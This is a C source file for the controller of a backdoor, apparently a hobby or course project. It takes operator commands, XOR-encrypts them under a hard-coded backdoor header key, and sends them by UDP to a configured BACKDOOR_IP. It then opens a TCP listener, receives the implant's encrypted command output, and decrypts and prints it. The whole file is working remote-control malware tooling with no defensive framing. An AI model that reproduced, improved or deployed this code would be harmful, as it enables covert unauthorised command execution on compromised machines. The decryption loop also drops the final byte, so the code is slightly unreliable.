#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <netinet/in.h> 
#include <netdb.h>
#include "config.h"

void printData(int sockfd);
int main(int argc, char **argv) {
    while(1){
        printf("\nEnter the command:\n> ");
        /* read a command */
        char* prompt=NULL;
        size_t n = 0;
        getline(&prompt,&n,stdin);

        /* XOR encryption */

        int prompt_len = strlen(prompt);
        *(prompt + prompt_len - 1) = '\0';
        char cmd_start[]=COMMAND_START;
        char cmd_end[]=COMMAND_END;
        char raw_data[ECP_LEN];
        snprintf(raw_data,ECP_LEN,"%s%s%s",cmd_start,prompt,cmd_end);
        char* ptr;
        char encrypt[ECP_LEN]="";
        ptr = raw_data;
        int len = strlen(ptr);
        int loop = strlen(encrypt); 
        for (loop = 0; loop < len; loop++) {
            encrypt[loop] = ptr[loop] ^ PASSWORD[(loop % PASSLEN)];
        }

        /* BACKDOOR HEADER KEY + encrypted data */
        int total_len = len + BACKDOOR_HEADER_LEN;
        char cmd_to_send[CMD_LEN] = "";
        char backdoor_header_key[] = BACKDOOR_HEADER_KEY;
        int j;
        for (j = 0; j < BACKDOOR_HEADER_LEN; j++) {
            cmd_to_send[j] = backdoor_header_key[j];
        }
        int k;
        for (k = 0; k < len; k++) {
            cmd_to_send[(j++)] = encrypt[k];
        }

        /* SEND UDP Packet*/
        int sockfd; 
        struct sockaddr_in servaddr; 
    
        if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
            perror("socket creation failed"); 
            exit(EXIT_FAILURE); 
        } 
    
        memset(&servaddr, 0, sizeof(servaddr)); 
        
        servaddr.sin_family = AF_INET; 
        servaddr.sin_port = htons(BACKDOOR_PORT); 
        servaddr.sin_addr.s_addr = inet_addr(BACKDOOR_IP); /* Server's Address   */    
        
        sendto(sockfd, (const char *)cmd_to_send, (total_len), 
                MSG_CONFIRM, (const struct sockaddr *) &servaddr,  
                sizeof(servaddr)); 

        /*TCP Port Open and receive the message */
        int tcp_sockfd, connfd; 
        struct sockaddr_in clientaddr, serv;
        tcp_sockfd = socket(AF_INET, SOCK_STREAM, 0); 
        if (tcp_sockfd == -1) { 
            printf("socket creation failed\n"); 
            exit(0); 
        } 
        int enable = 1;
        setsockopt(tcp_sockfd,SOL_SOCKET, SO_REUSEADDR, &enable,sizeof(int));
        bzero(&clientaddr, sizeof(clientaddr));
        clientaddr.sin_family = AF_INET;
        clientaddr.sin_addr.s_addr = htonl(INADDR_ANY);
        clientaddr.sin_port = htons(CLIENT_PORT);
        if ((bind(tcp_sockfd, (struct sockaddr*)&clientaddr, sizeof(clientaddr))) != 0) { 
            printf("socket bind failed\n"); 
            exit(0); 
        }
        if ((listen(tcp_sockfd, 5)) < 0) { 
            printf("Listen failed\n"); 
            exit(0); 
        }
        socklen_t s_len = sizeof(serv); 
        connfd = accept(tcp_sockfd, (struct sockaddr*)&serv, &s_len);
        if (connfd < 0) { 
            printf("server acccept failed\n"); 
            exit(0); 
        }
        printData(connfd);
        close(tcp_sockfd);
    }
}
void printData(int sockfd) 
{ 
    char buff[DATA_SIZE]; 
    bzero(buff, DATA_SIZE);
    printf("\nResult:\n");
    
    /*Receive the encrypted data */
    int n; 
    n = recv(sockfd, buff, sizeof(buff),0);
    if(n < 0) {
        printf("nothing recevied.\n");
        exit(7);
    }
    
    /*Decrypt Data*/
    char decrypt_data[DATA_SIZE] = "";
    char* ptr = buff;
    int len = n;
    int loop;
    for(loop = 0; loop < (len - 1); loop++) {
        decrypt_data[loop] = ptr[loop] ^ PASSWORD[(loop % PASSLEN)];
        if(ptr[loop] == 0){

        }
    }
    decrypt_data[loop] = '\0';

    printf("%s\n", decrypt_data);
} 
